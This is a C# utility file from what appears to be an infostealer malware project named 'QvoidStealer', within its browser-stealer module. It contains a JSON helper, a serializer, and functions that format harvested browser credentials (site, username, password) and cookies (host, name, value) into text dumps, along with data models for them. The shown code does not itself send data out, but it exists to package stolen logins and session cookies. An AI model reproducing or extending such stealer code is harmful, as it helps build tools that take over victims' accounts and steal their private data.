using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

//I didn't write this implementation, if you are the owner of this code contact me for a credit.

namespace QvoidStealer.Miscellaneous.Stealers.Browsers
{
    internal sealed class Json
    {
        public string Data;
        public Json(string data)
        {
            this.Data = data;
        }
        // Get string value from json dictonary
        public string GetValue(string value)
        {
            string result = String.Empty;
            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
            Match valueMatch = valueRegex.Match(this.Data);
            if (!valueMatch.Success)
                return result;

            result = Regex.Split(valueMatch.Value, "\"")[3];
            return result;
        }
        // Remove string
        public void Remove(string[] values)
        {
            foreach (string value in values)
                this.Data = this.Data.Replace(value, "");
        }
        // Get array from json data
        public string[] SplitData(string delimiter = "},")
        {
            return Regex.Split(this.Data, delimiter);
        }
    }

    internal static class Utils
    {
        /// <summary>
        /// Convert Color object into hex integer
        /// </summary>
        /// <param name="color">Color to be converted</param>
        /// <returns>Converted hex integer</returns>
        public static int ColorToHex(Color color)
        {
            string HS =
                color.R.ToString("X2") +
                color.G.ToString("X2") +
                color.B.ToString("X2");

            return int.Parse(HS, System.Globalization.NumberStyles.HexNumber);
        }

        internal static JObject StructToJson(object @struct)
        {
            Type type = @struct.GetType();
            JObject json = new JObject();

            FieldInfo[] fields = type.GetFields();
            foreach (FieldInfo field in fields)
            {
                string name = FieldNameToJsonName(field.Name);
                object value = field.GetValue(@struct);
                if (value == null)
                    continue;

                if (value is bool)
                    json.Add(name, (bool)value);
                else if (value is int)
                    json.Add(name, (int)value);
                else if (value is Color)
                    json.Add(name, ColorToHex((Color)value));
                else if (value is string)
                    json.Add(name, value as string);
                else if (value is DateTime)
                    json.Add(name, ((DateTime)value).ToString("O"));
                else if (value is IList && value.GetType().IsGenericType)
                {
                    JArray array = new JArray();
                    foreach (object obj in value as IList)
                        array.Add(StructToJson(obj));
                    json.Add(name, array);
                }
                else json.Add(name, StructToJson(value));
            }
            return json;
        }

        static string[] ignore = { "InLine" };
        internal static string FieldNameToJsonName(string name)
        {
            if (ignore.ToList().Contains(name))
                return name.ToLower();

            List<char> result = new List<char>();

            if (IsFullUpper(name))
                result.AddRange(name.ToLower().ToCharArray());
            else
                for (int i = 0; i < name.Length; i++)
                {
                    if (i > 0 && char.IsUpper(name[i]))
                        result.AddRange(new[] { '_', char.ToLower(name[i]) });
                    else result.Add(char.ToLower(name[i]));
                }
            return string.Join("", result);
        }

        internal static bool IsFullUpper(string str)
        {
            bool upper = true;
            for (int i = 0; i < str.Length; i++)
            {
                if (!char.IsUpper(str[i]))
                {
                    upper = false;
                    break;
                }
            }
            return upper;
        }

        public static string Decode(Stream source)
        {
            using (StreamReader reader = new StreamReader(source))
                return reader.ReadToEnd();
        }

        public static byte[] Encode(string source, string encoding = "utf-8")
            => Encoding.GetEncoding(encoding).GetBytes(source);

        public static string ToString(this List<CredentialModel> credentialModels, string BrowserName)
        {
            string result = string.Empty;

            if (credentialModels == null)
                return "";

            foreach (var model in credentialModels)
            {
                result += $"{Environment.NewLine}Browser  : {BrowserName}";
                result += $"{Environment.NewLine}URL      : {model.Url}";
                result += $"{Environment.NewLine}Username : {model.Username}";
                result += $"{Environment.NewLine}Password : {model.Password}";
                result += $"{Environment.NewLine}---------------------------------------------------------------------";
            }


            return result;
        }

        public static string ToString(this CredentialModel credentialModel, string BrowserName)
        {
            string result = string.Empty;

            if (credentialModel == null)
                return "";

            result += $"{Environment.NewLine}Browser  : {BrowserName}";
            result += $"{Environment.NewLine}URL      : {credentialModel.Url}";
            result += $"{Environment.NewLine}Username : {credentialModel.Username}";
            result += $"{Environment.NewLine}Password : {credentialModel.Password}";
            result += $"{Environment.NewLine}---------------------------------------------------------------------";

            return result;
        }

        public static string ToString(this List<CookieModel> cookieModels, string BrowserName)
        {
            string result = string.Empty;

            if (cookieModels == null)
                return "";

            foreach (var model in cookieModels)
            {
                result += $"{Environment.NewLine}Browser   : {BrowserName}";
                result += $"{Environment.NewLine}Host Name : {model.HostName}";
                result += $"{Environment.NewLine}Name      : {model.Name}";
                result += $"{Environment.NewLine}Value     : {model.Value}";
                result += $"{Environment.NewLine}---------------------------------------------------------------------";
            }

            return result;
        }

        public static string ToString(this CookieModel cookieModel, string BrowserName)
        {
            string result = string.Empty;

            if (cookieModel == null)
                return "";

            result += $"{Environment.NewLine}Browser   : {BrowserName}";
            result += $"{Environment.NewLine}Host Name : {cookieModel.HostName}";
            result += $"{Environment.NewLine}Name      : {cookieModel.Name}";
            result += $"{Environment.NewLine}Value     : {cookieModel.Value}";
            result += $"{Environment.NewLine}---------------------------------------------------------------------";

            return result;
        }
    }

    public class CredentialModel
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }

    public class CookieModel
    {
        public string Name;
        public string Value;
        public string HostName;
    }
}
